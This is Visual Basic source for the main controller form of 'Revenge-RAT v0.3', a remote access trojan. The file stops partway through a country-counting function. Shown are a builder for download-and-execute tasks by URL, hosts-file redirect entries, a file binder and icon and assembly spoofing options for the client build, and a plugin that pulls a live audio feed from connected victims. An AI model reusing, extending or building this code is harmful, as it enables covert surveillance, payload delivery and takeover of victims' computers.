Imports Microsoft.VisualBasic.CompilerServices
Imports System.Drawing.IconLib
Imports System.Drawing.Imaging
Imports System.IO
Imports System.Net
Imports System.Reflection
Imports System.Runtime.CompilerServices
Imports System.Text
Imports System.Threading
Imports System.Xml
Imports Revenge_RAT_v0._3.RevengeRAT
Imports Revenge_RAT_v0._3.RevengeRAT.SocketServer
Imports System.Windows.Forms.ListView
Imports System.Windows.Forms.ListViewItem

Public Class Main
    Private _s As SocketServer
    Public Shared Afghanistan As Object
    Public AL As Boolean
    Public Shared AlandIslands As Object
    Public Shared Albania As Object
    Public Shared Algeria As Object
    Public Shared AmericanSamoa As Object
    Public Shared Andorra As Object
    Public Shared Angola As Object
    Public Shared Anguilla As Object
    Public Shared Antarctica As Object
    Public Shared AntiguaandBarbuda As Object
    Public Shared Argentina As Object
    Public Shared Armenia As Object
    Public Shared Aruba As Object
    Public Shared Australia As Object
    Public Shared Austria As Object
    Public Shared Azerbaijan As Object
    Public Shared Bahamas As Object
    Public Shared Bahrain As Object
    Public Shared Bangladesh As Object
    Public Shared Barbados As Object
    Public Shared Belarus As Object
    Public Shared Belgium As Object
    Public Shared Belize As Object
    Public Shared Benin As Object
    Public Shared Bermuda As Object
    Public Shared Bhutan As Object
    Private Bla As Boolean
    Public Shared Bolivia As Object
    Public Shared BosniaandHerzegovina As Object
    Public Shared Botswana As Object
    Public Shared BouvetIsland As Object
    Public Shared Brazil As Object
    Public Shared BritishIndianOceanTerritory As Object
    Public Shared BritishVirginIsland As Object
    Public Shared BruneiDarussalam As Object
    Public Shared Bulgaria As Object
    Public Shared BurkinaFaso As Object
    Public Shared Burundi As Object
    Public Shared Cambodia As Object
    Public Shared Cameroon As Object
    Public Shared Canada As Object
    Public Shared Catalonia As Object
    Public Shared CaymanIslands As Object
    Public Shared CCKI As Object
    Public Shared CentralAfricanRepublic As Object
    Public Shared Chad As Object
    Public Shared Chile As Object
    Public Shared China As Object
    Public Shared ChristmasIsland As Object
    Public Shared Colombia As Object
    Public Shared Comoros As Object
    Public Config As XmlDocument
    Public Shared Congo As Object
    Public Shared CookIslands As Object
    Public Shared CostaRica As Object
    Public Shared CoteDIvoire As Object
    Public Shared Croatia As Object
    Public CT As Integer
    Public Shared Cuba As Object
    Public Shared CVC As Object
    Public Shared Cyprus As Object
    Public Shared CzechRepublic As Object
    Public Shared DemocraticRepublicoftheCongo As Object
    Public Shared Denmark As Object
    Public Shared Djibouti As Object
    Public Document As XmlDocument
    Public Shared Dominica As Object
    Public Shared DominicanRepublic As Object
    Public DV As Integer
    Public Shared Ecuador As Object
    Public Shared Egypt As Object
    Public Shared ElSalvador As Object
    Public Shared England As Object
    Public Shared EquatorialGuinea As Object
    Public Shared Eritrea As Object
    Public Shared Estonia As Object
    Public Shared Ethiopia As Object
    Public Shared Europe As Object
    Public Shared FalklandIslandsMalvinas As Object
    Public Shared FaroeIslands As Object
    Public Shared FederatedStatesofMicronesia As Object
    Public Shared Fiji As Object
    Public Shared Finland As Object
    Public Shared France As Object
    Public Shared FrenchGuiana As Object
    Public Shared FrenchPolynesia As Object
    Public Shared FrenchSouthernTerritories As Object
    Public Shared Gabon As Object
    Public Shared Gambia As Object
    Public GeoIP As Getcountry
    Public Shared Georgia As Object
    Public Shared Germany As Object
    Public Shared Ghana As Object
    Public Shared Gibraltar As Object
    Public Shared Greece As Object
    Public Shared Greenland As Object
    Public Shared Grenada As Object
    Public Shared Guadeloupe As Object
    Public Shared Guam As Object
    Public Shared Guatemala As Object
    Public Shared Guernsey As Object
    Public Shared Guinea As Object
    Public Shared GuineaBissau As Object
    Public Shared Guyana As Object
    Public Shared Haiti As Object
    Public Shared HeardIslandandMcDonaldIslands As Object
    Public Shared Honduras As Object
    Public Shared HongKong As Object
    Public Shared Hungary As Object
    Public Shared Iceland As Object
    Public Shared India As Object
    Public Shared Indonesia As Object
    Public Shared Iraq As Object
    Public Shared Ireland As Object
    Public Shared IslamicRepublicofIran As Object
    Public Shared IslamicRepublicofPakistan As Object
    Public Shared IsleofMan As Object
    Public Shared Italy As Object
    Public ITS As Boolean
    Public Shared Jamaica As Object
    Public Shared Japan As Object
    Public Shared Jersey As Object
    Public Shared Jordan As Object
    Public Shared Kazakhstan As Object
    Public Shared Kenya As Object
    Public Key As String
    Public Shared Kiribati As Object
    Public Shared Kuwait As Object
    Public Shared Kyrgyzstan As Object
    Public Shared LaoPeoplesDemocraticRepublic As Object
    Public Shared Latvia As Object
    Public Shared Lebanon As Object
    Public Shared Lesotho As Object
    Public Shared Liberia As Object
    Public Shared Libya As Object
    Public Shared Liechtenstein As Object
    Public Shared Lithuania As Object
    Public Shared Luxembourg As Object
    Private m_SortingColumn As ColumnHeader
    Public Shared Macao As Object
    Public Shared Madagascar As Object
    Public Shared Malawi As Object
    Public Shared Malaysia As Object
    Public Shared Maldives As Object
    Public Shared Mali As Object
    Public Shared Malta As Object
    Public Shared MarshallIslands As Object
    Public Shared Martinique As Object
    Public Shared Mauritania As Object
    Public Shared Mauritius As Object
    Public Shared Mayotte As Object
    Public Shared Mexico As Object
    Public Shared Mongolia As Object
    Public Shared Montenegro As Object
    Public Shared Montserrat As Object
    Public Shared Morocco As Object
    Public Shared Mozambique As Object
    Public Shared Myanmar As Object
    Public Shared NA As Object
    Public Shared Namibia As Object
    Public Shared Nauru As Object
    Public Shared Nepal As Object
    Public Shared Netherlands As Object
    Public Shared NetherlandsAntilles As Object
    Public Shared NewCaledonia As Object
    Public Shared NewZealand As Object
    Public Shared Nicaragua As Object
    Public Shared Niger As Object
    Public Shared Nigeria As Object
    Public Shared Niue As Object
    Public Shared NorfolkIsland As Object
    Public Shared NorthernMarianaIslands As Object
    Public Shared NorthKorea As Object
    Public Shared Norway As Object
    Public Shared Palau As Object
    Public Shared Palestine As Object
    Public Shared PalestinianTerritory As Object
    Public Shared Panama As Object
    Public Shared PapuaNewGuinea As Object
    Public Shared Paraguay As Object
    Public Shared Peru As Object
    Public Shared Philippines As Object
    Public Shared PitcairnIslands As Object
    Public PO As Integer
    Public Shared Poland As Object
    Public Shared Portugal As Object
    Public Shared PrincipalityofMonaco As Object
    Public Shared PuertoRico As Object
    Public PW As String
    Public Shared Qatar As Object
    Public ReIcon As NotifyIcon
    Public Shared RepublicofMacedonia As Object
    Public Shared RepublicofMoldova As Object
    Public Shared Reunion As Object
    Public REZ As Boolean
    Public Shared Romania As Object
    Public Shared Russia As Object
    Public Shared Rwanda As Object
    Public RWC As Boolean
    Public RWV As Integer
    Public SA As Boolean
    Public Shared SaintBarthelemy As Object
    Public Shared SaintHelena As Object
    Public Shared SaintKittsandNevis As Object
    Public Shared SaintLucia As Object
    Public Shared SaintPierreandMiquelon As Object
    Public Shared SaintVincentandtheGrenadines As Object
    Public Shared Samoa As Object
    Public Shared SanMarino As Object
    Public Shared SaoTomeandPrincipe As Object
    Public Shared SatelliteProvider As Object
    Public Shared SaudiArabia As Object
    Public Shared Scotland As Object
    Public Shared Senegal As Object
    Public Shared Serbia As Object
    Public Shared Seychelles As Object
    Public Shared SierraLeone As Object
    Public Shared Singapore As Object
    Public Shared Slovakia As Object
    Public Shared Slovenia As Object
    Public sock As Integer
    Public Shared SolomonIslands As Object
    Public Shared Somalia As Object
    Public Sound As Boolean
    Public Shared SouthAfrica As Object
    Public Shared SouthGeorgiaandtheSouthSandwichIslands As Object
    Public Shared SouthKorea As Object
    Public Shared Spain As Object
    Public Shared SriLanka As Object
    Public Shared Sudan As Object
    Public Shared SultanateofOman As Object
    Public Shared Suriname As Object
    Public Shared SvalbardandJanMayen As Object
    Public Shared Swaziland As Object
    Public Shared Sweden As Object
    Public Shared Switzerland As Object
    Public Shared Syria As Object
    Public Sz As Size
    Public Shared Taiwan As Object
    Public Shared Tajikistan As Object
    Public Shared Thailand As Object
    Private TI As String
    Private TI2 As String
    Public TIME As Integer
    Public Shared Togo As Object
    Public Shared Tokelau As Object
    Public Shared Tonga As Object
    Public Shared TrinidadAndTobago As Object
    Public Shared Tunisia As Object
    Public Shared Turkey As Object
    Public Shared Turkmenistan As Object
    Public Shared TurksandCaicosIslands As Object
    Public Shared Tuvalu As Object
    Public Shared Uganda As Object
    Public Shared Ukraine As Object
    Public Shared UnitedArabEmirates As Object
    Public Shared UnitedKingdom As Object
    Public Shared UnitedRepublicofTanzania As Object
    Public Shared UnitedStates As Object
    Public Shared UnitedStatesMinorOutlyingIslands As Object
    Public Shared UnitedStatesVirginIslands As Object
    Public Shared Uruguay As Object
    Public Shared Uzbekistan As Object
    Public Shared Vanuatu As Object
    Public Shared VaticanCityState As Object
    Public Shared Venezuela As Object
    Public Shared Vietnam As Object
    Public VIS As Boolean
    Public Shared Wales As Object
    Public Shared WallisAndFutuna As Object
    Public Shared WesternSahara As Object
    Public Shared Yemen As Object
    Public Shared Zambia As Object
    Public Shared Zimbabwe As Object

    Public Delegate Sub _data(ByVal sock As Integer, ByVal b As Byte())

    Public Sub New()
        Me.s = New SocketServer
        Me.Key = Nothing
        Me.ReIcon = New NotifyIcon
        Me.Document = New XmlDocument
        Me.PW = String.Empty
        Me.GeoIP = New Getcountry((Application.StartupPath & "\GeoIP.dat"))
        Me.SA = False
        Me.ITS = False
        Me.Sound = False
        Me.VIS = False
        Me.TI = DateTime.Now.ToString("yyyy-MM-dd")
        Me.TIME = 0
        Me.TI2 = DateAndTime.TimeOfDay.ToString("h-mm-ss tt")
        Me.Bla = False
        Me.Config = New XmlDocument
        Me.InitializeComponent()
    End Sub

    Private Sub Add_Click(sender As Object, e As EventArgs) Handles Add.Click
        If (Me.Comands.Text.Length = 0) Then
            MessageBox.Show("Please select a command!", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        ElseIf ((Me.Comands.SelectedIndex = 0) AndAlso (Me.CommandData.Text.Length = 0)) Then
            MessageBox.Show("Please add a URL!", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        Else
            If (Me.Comands.SelectedIndex = 0) Then
                Dim enumerator As IEnumerator
                Dim str As String = Interaction.InputBox("File Name and extension", "Revenge-RAT v0.3", "Client.exe", -1, -1)
                If (str.Length <= 0) Then
                    MessageBox.Show("Please add a invalid extension!", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
                    Return
                End If
                Try
                    enumerator = Me.CommandsListview.Items.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        If (current.SubItems.Item(1).Text = Me.CommandData.Text) Then
                            MessageBox.Show("This command already exists!", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
                            Return
                        End If
                    Loop
                Finally
                End Try
                Dim item As ListViewItem = Me.CommandsListview.Items.Add(Me.Comands.Text)
                item.SubItems.Add(Me.CommandData.Text)
                item.SubItems.Add(Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))))
                item.Tag = str
                item.ToolTipText = Conversions.ToString(Me.Comands.SelectedIndex)
            End If
            If ((((Me.Comands.SelectedIndex = 1) Or (Me.Comands.SelectedIndex = 2)) Or (Me.Comands.SelectedIndex = 3)) Or (Me.Comands.SelectedIndex = 4)) Then
                Dim enumerator2 As IEnumerator
                Try
                    enumerator2 = Me.CommandsListview.Items.GetEnumerator
                    Do While enumerator2.MoveNext
                        Dim item4 As ListViewItem = DirectCast(enumerator2.Current, ListViewItem)
                        If ((Not (Conversions.ToDouble(item4.ToolTipText) = 0) Or (Conversions.ToDouble(item4.ToolTipText) = 1)) AndAlso (Conversions.ToDouble(item4.ToolTipText) = Me.Comands.SelectedIndex)) Then
                            MessageBox.Show("This command already exists!", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
                            Return
                        End If
                    Loop
                Finally
                End Try
                Dim item3 As ListViewItem = Me.CommandsListview.Items.Add(Me.Comands.Text)
                item3.SubItems.Add("Null")
                item3.SubItems.Add(Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))))
                item3.Tag = "Null"
                item3.ToolTipText = Conversions.ToString(Me.Comands.SelectedIndex)
            End If
        End If
    End Sub

    Private Sub Addcustomiconpath_Click(sender As Object, e As EventArgs) Handles Addcustomiconpath.Click
        Dim dialog As New OpenFileDialog
        dialog.Filter = "Ico|*.ico"
        dialog.Title = "Ico"
        dialog.ShowDialog()

        If (dialog.FileName.Length > 0) Then
            Me.icopath.Text = dialog.FileName
            Me.PictureBox4.ImageLocation = dialog.FileName
        End If
    End Sub

    Private Sub Adddns_Click(sender As Object, e As EventArgs) Handles Adddns.Click
        If (Me.IPAddres.Text = Nothing) Then
            MessageBox.Show("you must add ip!!", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        ElseIf (Me.DNS.Text = Nothing) Then
            MessageBox.Show("you must add a dns!!", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        Else
            Me.Hostsfilelist.Items.Add(Me.IPAddres.Text).SubItems.Add(Me.DNS.Text)
        End If
    End Sub

    Private Sub AddFile_Click(sender As Object, e As EventArgs) Handles AddFile.Click
        Me.ADDFILETOLIST()
    End Sub

    Private Sub AddHost_Click(sender As Object, e As EventArgs) Handles AddHost.Click
        If (Me.ClientHost.Text = Nothing) Then
            MessageBox.Show("you must add your host or ip!", "Revenge-RAT v.0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        Else
            Me.HostsList.Items.Add(Me.ClientHost.Text, 0).SubItems.Add(Me.ClientPort.Value.ToString)
        End If
    End Sub

    Private Sub AddNewPluginToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddNewPluginToolStripMenuItem.Click
        Dim addp As New ADDP
        addp.Text = ("Add a new custom plugin @" & Environment.MachineName)
        addp.ShowDialog()
    End Sub

    Private Sub ADDT_Click(sender As Object, e As EventArgs) Handles ADDT.Click
        Dim dialog As New OpenFileDialog
        Dim dialog2 As OpenFileDialog = dialog
        dialog.Title = "Select your theme"
        dialog.Filter = "Theme|*.XML"
        dialog.ShowDialog()
        dialog2 = Nothing
        If (dialog.FileName.Length > 0) Then
            File.Copy(dialog.FileName, (Application.StartupPath & "\Themes\" & Path.GetFileName(dialog.FileName)), True)
            Me.THN.Items.Add(Path.GetFileNameWithoutExtension(dialog.FileName))
        End If
    End Sub

    Private Sub AddToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles AddToolStripMenuItem1.Click
        Dim expression As String = Interaction.InputBox("Add a new connection", "Revenge-RAT v0.3", "127.0.0.1:333", -1, -1)
        If (expression = Nothing) Then
            MessageBox.Show("you must add your host or ip!", "Revenge-RAT v.0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
        Else
            Dim strArray As String() = Strings.Split(expression, ":", -1, CompareMethod.Binary)
            If (strArray(0) = Nothing) Then
                MessageBox.Show("you must add your host or ip!", "Revenge-RAT v.0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            ElseIf (strArray(1) = Nothing) Then
                MessageBox.Show("you must add your port!", "Revenge-RAT v.0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            Else
                Me.HostsList.Items.Add(strArray(0), 0).SubItems.Add(strArray(1))
            End If
        End If
    End Sub

    Private Sub AddToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles AddToolStripMenuItem2.Click
        Me.ADDFILETOLIST()
    End Sub

    Private Sub AddToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddToolStripMenuItem.Click
        Dim text As String = Interaction.InputBox("Add IP Adress", "Block IP", "127.0.0.1", -1, -1)
        If ([text].Length > 0) Then
            Me.BlockedIp.Items.Add([text]).SubItems.Add(Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))))
        End If
    End Sub

    Private Sub Apply_Click(sender As Object, e As EventArgs) Handles Apply.Click
        Me.Save()
        Me.Load_Config()
    End Sub

    Private Sub APPS_Click(sender As Object, e As EventArgs) Handles APPS.Click
        If Operators.ConditionalCompareObjectEqual(Me.APPS.Tag, "Down", False) Then
            Me.APPS.Tag = "Up"
            Me.APPS.Image = My.Resources.expand_less_white_24x24
            Dim size3 As New Size(Me.TableLayoutPanel47.Size.Width, &H20)
            Me.TableLayoutPanel47.Size = size3
        Else
            Me.APPS.Tag = "Down"
            Me.APPS.Image = My.Resources.expand_more_white_24x24
            Dim size2 As New Size(Me.TableLayoutPanel47.Size.Width, &H59)
            Me.TableLayoutPanel47.Size = size2
        End If
    End Sub

    Private Sub ASD_CheckedChanged(sender As Object, e As EventArgs) Handles ASD.CheckedChanged
        Me.RDV.Enabled = Me.ASD.Checked
    End Sub

    Private Sub ASS_Click(sender As Object, e As EventArgs) Handles ASS.Click
        If Operators.ConditionalCompareObjectEqual(Me.ASS.Tag, "Down", False) Then
            Me.ASS.Tag = "Up"
            Me.ASS.Image = My.Resources.expand_less_white_24x24
            Dim size3 As New Size(Me.TableLayoutPanel51.Size.Width, &H20)
            Me.TableLayoutPanel51.Size = size3
        Else
            Me.ASS.Tag = "Down"
            Me.ASS.Image = My.Resources.expand_more_white_24x24
            Dim size2 As New Size(Me.TableLayoutPanel51.Size.Width, &HB9)
            Me.TableLayoutPanel51.Size = size2
        End If
    End Sub

    Private Sub AssemblyChange_CheckedChanged(sender As Object, e As EventArgs) Handles AssemblyChange.CheckedChanged
        Me.GroupBox6.Enabled = Me.AssemblyChange.Checked
    End Sub

    Private Sub AssemblySettings_Click(sender As Object, e As EventArgs) Handles AssemblySettings.Click
        If Operators.ConditionalCompareObjectEqual(Me.AssemblySettings.Tag, "Down", False) Then
            Me.AssemblySettings.Tag = "Up"
            Me.AssemblySettings.Image = My.Resources.expand_less_white_24x24
            Dim size3 As New Size(Me.TableLayoutPanel43.Size.Width, &H20)
            Me.TableLayoutPanel43.Size = size3
        Else
            Me.AssemblySettings.Tag = "Down"
            Me.AssemblySettings.Image = My.Resources.expand_more_white_24x24
            Dim size2 As New Size(Me.TableLayoutPanel43.Size.Width, 430)
            Me.TableLayoutPanel43.Size = size2
        End If
    End Sub

    Private Sub ASWC_CheckedChanged(sender As Object, e As EventArgs) Handles ASWC.CheckedChanged
        Me.RWCV.Enabled = Me.ASWC.Checked
    End Sub

    Private Sub AudioFeedToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AudioFeedToolStripMenuItem.Click
        If File.Exists((Application.StartupPath & "\Plugin\MC.dll")) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.Listview1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.Tag = "Pause"
                    Me.s.Send(Conversions.ToInteger(current.ToolTipText), String.Concat(New String() {"IE", Me.Key, SocketServer.md5(File.ReadAllBytes((Application.StartupPath & "\Plugin\MC.dll"))), Me.Key, current.ToolTipText, Me.Key, Conversions.ToString(True), Me.Key, "MC", Me.Key, "MC"}))
                Loop
            Finally
            End Try
        End If
    End Sub

    Private Sub BASSS_Click(sender As Object, e As EventArgs) Handles BASSS.Click
        If Operators.ConditionalCompareObjectEqual(Me.BASSS.Tag, "Down", False) Then
            Me.BASSS.Tag = "Up"
            Me.BASSS.Image = My.Resources.expand_less_white_24x24
            Dim size3 As New Size(Me.TableLayoutPanel25.Size.Width, &H20)
            Me.TableLayoutPanel25.Size = size3
        Else
            Me.BASSS.Tag = "Down"
            Dim size2 As New Size(Me.TableLayoutPanel25.Size.Width, &HA5)
            Me.TableLayoutPanel25.Size = size2
            Me.BASSS.Image = My.Resources.expand_more_white_24x24
        End If
    End Sub

    Private Sub BICONS_SelectedIndexChanged(sender As Object, e As EventArgs) Handles BICONS.SelectedIndexChanged
        Try
            Me.icopath.Text = Nothing
            Me.PictureBox4.ImageLocation = Me.BICONS.SelectedItems.Item(0).ToolTipText
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        My.Forms.EPRN.ShowDialog()
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        If Not My.Computer.FileSystem.DirectoryExists((Application.StartupPath & "\Profiles\")) Then
            My.Computer.FileSystem.CreateDirectory((Application.StartupPath & "\Profiles\"))
        End If
        File.WriteAllText((Application.StartupPath & "\Profiles\Default.ini"), My.Resources.DefaultSettings)
        Me.Load_Builder_Settings("Default")
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        My.Forms.LPRO.ShowDialog()
    End Sub
    Public Function CEF(ByVal Input As String) As Boolean
        Return (Input.EndsWith(".XML") OrElse Input.EndsWith(".xml"))
    End Function

    Public Function ADDFILETOLIST() As Object
        Dim obj2 As Object
        Dim dialog As New OpenFileDialog
        dialog.ShowDialog()

        If (dialog.FileName.Length > 0) Then
            Dim enumerator As IEnumerator
            Dim info As New FileInfo(dialog.FileName)
            Try
                enumerator = Me.BinderFilesList.Items.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    If (current.SubItems.Item(0).Text = dialog.FileName) Then
                        MessageBox.Show("File already in list!", "Revenge-RAT v0.3", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
                        Return obj2
                    End If
                Loop
            Finally
            End Try
            Dim icon As Icon = Icon.ExtractAssociatedIcon(dialog.FileName)
            Dim icon3 As SingleIcon = New MultiIcon().Add(Path.GetExtension(dialog.FileName))
            icon3.CreateFrom(icon.ToBitmap, IconOutputFormat.Vista)
            If Not Directory.Exists((Interaction.Environ("Temp") & "\Revenge-RAT-Builder\")) Then
                Directory.CreateDirectory((Interaction.Environ("Temp") & "\Revenge-RAT-Builder\"))
            End If
            icon3.Save((Interaction.Environ("Temp") & "\Revenge-RAT-Builder\" & Path.GetFileNameWithoutExtension(dialog.FileName) & ".ico"))
            Me.ImageList5.Images.Add(Path.GetFileNameWithoutExtension(dialog.FileName), New Bitmap((Interaction.Environ("Temp") & "\Revenge-RAT-Builder\" & Path.GetFileNameWithoutExtension(dialog.FileName) & ".ico")))
            Dim item As ListViewItem = Me.BinderFilesList.Items.Add(dialog.FileName, Me.ImageList5.Images.IndexOfKey(Path.GetFileNameWithoutExtension(dialog.FileName)))
            item.SubItems.Add(Path.GetExtension(dialog.FileName))
            item.SubItems.Add(SocketServer.GetSize(CULng(info.Length)))
            Me.FNTX.Text = dialog.FileName
        End If
        Return obj2
    End Function
    Public Function AVTI(ByVal queryCountry As String) As Object
        Dim obj2 As Object
        Dim str As String = queryCountry
        If (str = Strings.UCase("Afghanistan")) Then
            Main.Afghanistan = Operators.AddObject(Main.Afghanistan, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Albania")) Then
            Main.Albania = Operators.AddObject(Main.Albania, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Algeria")) Then
            Main.Algeria = Operators.AddObject(Main.Algeria, 1)
            Return obj2
        End If
        If (str = Strings.UCase("American Samoa")) Then
            Main.AmericanSamoa = Operators.AddObject(Main.AmericanSamoa, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Andorra")) Then
            Main.Andorra = Operators.AddObject(Main.Andorra, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Angola")) Then
            Main.Angola = Operators.AddObject(Main.Angola, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Anguilla")) Then
            Main.Anguilla = Operators.AddObject(Main.Anguilla, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Antigua & Barbuda")) Then
            Main.AntiguaandBarbuda = Operators.AddObject(Main.AntiguaandBarbuda, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Argentina")) Then
            Main.Argentina = Operators.AddObject(Main.Argentina, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Armenia")) Then
            Main.Armenia = Operators.AddObject(Main.Armenia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Aruba")) Then
            Main.Aruba = Operators.AddObject(Main.Aruba, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Australia")) Then
            Main.Australia = Operators.AddObject(Main.Australia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Austria")) Then
            Main.Austria = Operators.AddObject(Main.Austria, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Azerbaijan")) Then
            Main.Azerbaijan = Operators.AddObject(Main.Azerbaijan, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Bahamas")) Then
            Main.Bahamas = Operators.AddObject(Main.Bahamas, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Bahrain")) Then
            Main.Bahrain = Operators.AddObject(Main.Bahrain, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Bangladesh")) Then
            Main.Bangladesh = Operators.AddObject(Main.Bangladesh, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Barbados")) Then
            Main.Barbados = Operators.AddObject(Main.Barbados, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Belarus")) Then
            Main.Belarus = Operators.AddObject(Main.Belarus, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Belgium")) Then
            Main.Belize = Operators.AddObject(Main.Belize, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Belize")) Then
            Main.Belize = Operators.AddObject(Main.Belize, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Benin")) Then
            Main.Benin = Operators.AddObject(Main.Benin, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Bermuda")) Then
            Main.Bermuda = Operators.AddObject(Main.Bermuda, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Bhutan")) Then
            Main.Bhutan = Operators.AddObject(Main.Bhutan, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Bolivia")) Then
            Main.Bolivia = Operators.AddObject(Main.Bolivia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Bosnia & Herzegovina")) Then
            Main.BosniaandHerzegovina = Operators.AddObject(Main.BosniaandHerzegovina, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Botswana")) Then
            Main.Botswana = Operators.AddObject(Main.Botswana, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Bouvet Island")) Then
            Main.BouvetIsland = Operators.AddObject(Main.BouvetIsland, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Brazil")) Then
            Main.Brazil = Operators.AddObject(Main.Brazil, 1)
            Return obj2
        End If
        If (str = Strings.UCase("British Indian Ocean Territory")) Then
            Main.BritishIndianOceanTerritory = Operators.AddObject(Main.BritishIndianOceanTerritory, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Virgin Islands British")) Then
            Main.BritishVirginIsland = Operators.AddObject(Main.BritishVirginIsland, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Brunei")) Then
            Main.BruneiDarussalam = Operators.AddObject(Main.BruneiDarussalam, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Bulgaria")) Then
            Main.Bulgaria = Operators.AddObject(Main.Bulgaria, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Burkina Faso")) Then
            Main.BurkinaFaso = Operators.AddObject(Main.BurkinaFaso, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Burundi")) Then
            Main.Burundi = Operators.AddObject(Main.Burundi, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Cambodia")) Then
            Main.Cambodia = Operators.AddObject(Main.Cambodia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Cameroon")) Then
            Main.Cameroon = Operators.AddObject(Main.Cameroon, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Canada")) Then
            Main.Canada = Operators.AddObject(Main.Canada, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Cape Verde")) Then
            Main.CVC = Operators.AddObject(Main.CVC, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Catalonia")) Then
            Main.Catalonia = Operators.AddObject(Main.Catalonia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Cayman Islands")) Then
            Main.CaymanIslands = Operators.AddObject(Main.CaymanIslands, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Central African Republic")) Then
            Main.CentralAfricanRepublic = Operators.AddObject(Main.CentralAfricanRepublic, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Chad")) Then
            Main.Chad = Operators.AddObject(Main.Chad, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Chile")) Then
            Main.Chile = Operators.AddObject(Main.Chile, 1)
            Return obj2
        End If
        If (str = Strings.UCase("China")) Then
            Main.China = Operators.AddObject(Main.China, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Christmas Island")) Then
            Main.ChristmasIsland = Operators.AddObject(Main.ChristmasIsland, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Cocos (Keeling) Islands")) Then
            Main.CCKI = Operators.AddObject(Main.CCKI, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Colombia")) Then
            Main.Colombia = Operators.AddObject(Main.Colombia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Comoros")) Then
            Main.Comoros = Operators.AddObject(Main.Comoros, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Democratic Republic of the Congo")) Then
            Main.DemocraticRepublicoftheCongo = Operators.AddObject(Main.DemocraticRepublicoftheCongo, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Costa Rica")) Then
            Main.CostaRica = Operators.AddObject(Main.CostaRica, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Croatia")) Then
            Main.Croatia = Operators.AddObject(Main.Croatia, 1)
            Return obj2
        End If
        If (str = Strings.UCase("Cuba")) Then
            Main.Cuba = Operators.AddObject(Main.Cuba, 1)
            Return obj2
        End If
